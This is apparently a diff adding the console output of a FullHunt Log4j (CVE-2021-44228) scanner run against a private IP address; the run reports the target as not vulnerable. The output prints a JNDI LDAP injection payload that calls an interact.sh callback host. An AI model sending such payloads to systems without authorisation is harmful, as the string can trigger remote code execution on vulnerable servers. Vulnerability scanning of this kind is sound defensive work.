@@ -1,0 +1,11 @@
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: http://172.23.101.159
+[•] URL: http://172.23.101.159 | PAYLOAD: ${jndi:ldap://172.23.101.159.650rr10199fj4w0g8km77w94o8911498u.interact.sh/64l2j30}
+EXCEPTION: [Errno 2] No such file or directory: 'headers.txt'
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[•] Targets do not seem to be vulnerable.
